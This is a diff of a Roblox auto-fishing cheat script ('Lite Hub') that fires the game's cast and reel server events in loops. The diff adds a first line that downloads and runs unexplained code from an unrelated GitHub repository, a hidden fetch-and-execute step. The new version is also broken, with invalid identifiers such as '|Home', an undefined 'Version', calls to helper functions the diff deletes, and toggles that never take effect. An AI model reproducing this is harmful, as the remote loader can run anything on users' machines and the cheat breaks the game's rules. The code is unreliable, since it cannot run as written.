@@ -1,141 +1,93 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/adopttesting/Testing/refs/heads/main/Settings"))()
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Main/main/Library/V3.lua"))()
-
 local Window = Library:MakeWindow({
-    Title = "Lite Hub",
+    Title = "Lite Hub | " .. Version,
     SaveFolder = "Lite Hub"
 })
+
 Window:AddMinimizeButton({
     Button = {Image = "rbxassetid://16022917595"},
     Corner = {CornerRadius = UDim.new(0, 5)}
 })
 
-local AutoFishing = Window:MakeTab({"Auto Fishing", ""})
+local |Home = Window:MakeTab({"| Home", "scan-face"})
+local |AutoFish = Window:MakeTab({"| Auto Fish", "Fish"})
 
--- Destroy Forward Portals
-task.spawn(function()
-    if game.Workspace:FindFirstChild("RobloxForwardPortals") then
-        game.Workspace.RobloxForwardPortals:Destroy()
-    end
-end)
-
--- Variables for toggles and selected rod
-local toggles = {
-    AutoEquipRod = false,
-    AutoCast = false,
-    AutoReel = false,
-    AutoShake = false
-}
-local selectedRod = ""
-local autoShakeConnection = nil
-
--- Create keypress and keyrelease functions using VirtualInputManager
-local function keypress(key)
-    local VirtualInputManager = game:GetService("VirtualInputManager")
-    VirtualInputManager:SendKeyEvent(true, key, false, nil)
-end
-
-local function keyrelease(key)
-    local VirtualInputManager = game:GetService("VirtualInputManager")
-    VirtualInputManager:SendKeyEvent(false, key, false, nil)
-end
-
--- Function to create toggles
-local function Toggle(Tab, Name, Desc, Default)
-    Tab:AddToggle({
-        Name = Name,
-        Description = Desc or "",
-        Default = Default,
-        Callback = function(Value)
-            toggles[Name:gsub(" ", "")] = Value
-        end
-    })
-end
-
--- Function to create dropdown
-local function Dropdown(Tab, Name, Desc, Option, Default)
-    Tab:AddDropdown({
-        Name = Name,
-        Description = Desc or "",
-        Options = Option,
-        Default = Default,
-        Callback = function(Value)
-            if Name == "Choose Rod" then
-                selectedRod = Value
-            end
-        end
-    })
-end
-
--- Adding dropdown and toggles
-AutoFishing:AddSection({"Rods"})
+-- Dropdown for selecting rod, moved this section to be more logical
 local rods = {
-    "Flimsy Rod", "Precision Rod", "Plastic Rod", "Carbon Rod", "Long Rod",
-    "Executive Rod", "No-Life Rod", "Rod Of The Depths", "Training Rod",
-    "Fast Rod", "Lucky Rod", "Steady Rod", "Fortune Rod", "Magma Rod",
-    "Reinforced Rod", "Stone Rod", "Phoenix Rod", "Midas Rod", "Trident Rod",
-    "Mythical Rod", "Rapid Rod", "Magnet Rod", "Nocturnal Rod", "Destiny Rod",
+    "Flimsy Rod", "Precision Rod", "Plastic Rod", "Carbon Rod", "Long Rod", 
+    "Executive Rod", "No-Life Rod", "Rod Of The Depths", "Training Rod", 
+    "Fast Rod", "Lucky Rod", "Steady Rod", "Fortune Rod", "Magma Rod", 
+    "Reinforced Rod", "Stone Rod", "Phoenix Rod", "Midas Rod", "Trident Rod", 
+    "Mythical Rod", "Rapid Rod", "Magnet Rod", "Nocturnal Rod", "Destiny Rod", 
     "Kings Rod", "Aurora Rod", "Scurvy Rod"
 }
-Dropdown(AutoFishing, "Choose Rod", "", rods, "")
-Toggle(AutoFishing, "Auto Equip Rod", "", false)
-Toggle(AutoFishing, "Auto Cast", "", false)
-Toggle(AutoFishing, "Auto Reel", "", false)
-Toggle(AutoFishing, "Auto Shake", "", false)
 
--- Event Handlers
-Library:AddConnection(game:GetService("RunService").Stepped, function()
-    if toggles.AutoEquipRod and selectedRod ~= "" then
-        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(selectedRod)
-        if tool then
-            game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
+local selectedRod = "Flimsy Rod" -- Default rod
+
+-- Dropdown for selecting rod
+Dropdown(|AutoFish, "Select Rod", "Choose a rod to equip", rods, "Flimsy Rod")
+
+-- Auto Equip Rod toggle
+local autoEquipRod = false
+Toggle(|AutoFish, "Auto Equip Rod", "This will equip the selected rod", false)
+
+-- Auto Cast toggle
+local autoCast = false
+Toggle(|AutoFish, "Auto Cast", "This will cast the selected rod every 0.1 seconds", false)
+
+-- Auto Reel toggle
+local autoReel = false
+Toggle(|AutoFish, "Auto Reel", "This will reel the rod every 0.2 seconds", false)
+
+-- Function to continuously cast the selected rod
+task.spawn(function()
+    while true do
+        if autoCast then
+            local rod = game.Players.LocalPlayer.Character:FindFirstChild(selectedRod)
+            if rod and rod:FindFirstChild("events") and rod.events:FindFirstChild("cast") then
+                local args = {
+                    [1] = 23.700000000000006,
+                    [2] = 1
+                }
+                -- Fire the cast event for the selected rod
+                rod.events.cast:FireServer(unpack(args))
+            end
         end
-    end
-
-    if toggles.AutoCast and selectedRod ~= "" then
-        local tool = game.Players.LocalPlayer.Character:FindFirstChild(selectedRod)
-        if tool and tool:FindFirstChild("events") and tool.events:FindFirstChild("cast") then
-            local args = {23.7, 1}
-            tool.events.cast:FireServer(unpack(args))
-        end
-    end
-
-    if toggles.AutoReel then
-        local args = {100, true}
-        game:GetService("ReplicatedStorage"):WaitForChild("events"):WaitForChild("reelfinished"):FireServer(unpack(args))
+        wait(0.1) -- Wait for 0.1 seconds before the next cast
     end
 end)
 
--- Auto Shake Functionality
-Library:AddConnection(game:GetService("RunService").Stepped, function()
-    if toggles.AutoShake then
-        if not autoShakeConnection then
-            -- Press "\" to enable navigation mode
-            keypress(Enum.KeyCode.BackSlash)
-            wait(0.1)
-            keyrelease(Enum.KeyCode.BackSlash)
-
-            -- Create Auto Shake connection
-            autoShakeConnection = game:GetService("RunService").Stepped:Connect(function()
-                keypress(Enum.KeyCode.S)
-                wait(0.1)
-                keyrelease(Enum.KeyCode.S)
-
-                wait(0.1) -- Add a small delay between keypresses for better handling
-                
-                keypress(Enum.KeyCode.Return)
-                wait(0.1)
-                keyrelease(Enum.KeyCode.Return)
-            end)
+-- Function to continuously reel the selected rod
+task.spawn(function()
+    while true do
+        if autoReel then
+            local args = {
+                [1] = 100,
+                [2] = true
+            }
+            -- Fire the reelfinished event
+            game:GetService("ReplicatedStorage"):WaitForChild("events"):WaitForChild("reelfinished"):FireServer(unpack(args))
         end
-    else
-        if autoShakeConnection then
-            autoShakeConnection:Disconnect()
-            autoShakeConnection = nil
-
-            -- Press "\" again to disable navigation mode
-            keypress(Enum.KeyCode.BackSlash)
-            wait(0.1)
-            keyrelease(Enum.KeyCode.BackSlash)
-        end
+        wait(0.2) -- Wait for 0.2 seconds before the next reel
     end
+end)
+
+-- Function to continuously equip the selected rod
+task.spawn(function()
+    while true do
+        if autoEquipRod then
+            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild(selectedRod)
+            if tool then
+                -- Equip the selected rod if it's not already equipped
+                game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
+            end
+        end
+        wait(0.1) -- Prevent too much processing
+    end
+end)
+
+-- Update the selected rod when the dropdown changes
+Dropdown(|AutoFish, "Select Rod", "Choose a rod to equip", rods, "Flimsy Rod", function(value)
+    selectedRod = value
 end)
